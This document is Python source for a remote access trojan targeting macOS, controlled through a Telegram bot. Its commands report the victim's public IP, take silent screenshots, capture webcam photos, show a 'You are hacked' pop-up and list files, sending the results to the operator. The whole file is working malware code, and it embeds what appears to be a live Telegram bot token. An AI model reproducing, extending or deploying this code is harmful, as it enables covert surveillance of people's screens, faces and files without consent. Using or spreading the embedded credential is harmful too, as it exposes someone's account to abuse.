from telegram import *
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
# from telegram.inputmedia import InputMediaPhoto
import requests
import urllib
import subprocess
import os
import sys


#Start fucntion to find the ip address of the victim
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg= "Welcome to the RAT application"
    # hostname = socket.gethostname()
    ippublic = requests.get('http://ip.42.pl/raw').text
    msg+="\nThe target ip is "+str(ippublic)
    await update.message.reply_text(msg)

#help menu on how to use the bot
async def help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = """
    Welcome to not help command
    ----------------------------
    Bot commands:
        [1] To start the RAT
        /start
        [2] To see the help menu
        /help
        [3] To take screenshot of the current display
        /screenshot
        [4] Send hacked Message 
        /hacked
        [5] Caputre the face of the victim
        /capture
        
"""
    await update.message.reply_text(msg)


#screenshot function to capture the screen of the victim
async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg= "Please wait....."
    await update.message.reply_text(msg)
    outcmd = "screencapture -x /tmp/try.jpeg"
    try:
        # ordinarily we would not use shell=True due to security concerns
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Python error: [%d]\n{}\n'.format(e.returncode, e.output))
    # print(dir(update.message))
    await update.message.reply_photo(open('/tmp/try.jpeg','rb'))
    outcmd = "rm /tmp/try.jpeg"
    try:
        # ordinarily we would not use shell=True due to security concerns
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Python error: [%d]\n{}\n'.format(e.returncode, e.output))


#function to create a pop up notification to the user 
async def hacked(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    outcmd="""osascript -e 'display notification "You are being watched" with title "Look here" subtitle "You are hacked" sound name "Submarine"'"""
    try:
        # ordinarily we would not use shell=True due to security concerns
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Python error: [%d]\n{}\n'.format(e.returncode, e.output))
    msg = "The victim has been notified"
    await update.message.reply_text(msg)


#capture funtion to take picture of the victim and send
async def capture(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg= "Please wait....."
    await update.message.reply_text(msg)
    outcmd = "imagesnap -w 1 /tmp/snapshot.png"
    try:
        # ordinarily we would not use shell=True due to security concerns
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Python error: [%d]\n{}\n'.format(e.returncode, e.output))
    # print(dir(update.message))
    await update.message.reply_photo(open('/tmp/snapshot.png','rb'))
    outcmd = "rm /tmp/snapshot.png"
    try:
        # ordinarily we would not use shell=True due to security concerns
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Python error: [%d]\n{}\n'.format(e.returncode, e.output))

#Function to list all the files in the current directory
async def listfiles(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg= "Welcome to the RAT application"
    outcmd = "ls -la"
    try:
        # ordinarily we would not use shell=True due to security concerns
        text=subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Python error: [%d]\n{}\n'.format(e.returncode, e.output))
    await update.message.reply_text(text)


#___________________main driver code_________________________________     
app = ApplicationBuilder().token("6359816178:AAHFntqBNSi2pNJ3_peGbAr3tFhbji5bCLo").build()

# /start
app.add_handler(CommandHandler("start", start))

#/help
app.add_handler(CommandHandler("help", help))

#/screenshot
app.add_handler(CommandHandler("screenshot", screenshot))

#/hacked
app.add_handler(CommandHandler("hacked", hacked))

#/capture
app.add_handler(CommandHandler("capture", capture))

#/listfiles
app.add_handler(CommandHandler("listfiles", listfiles))


app.run_polling()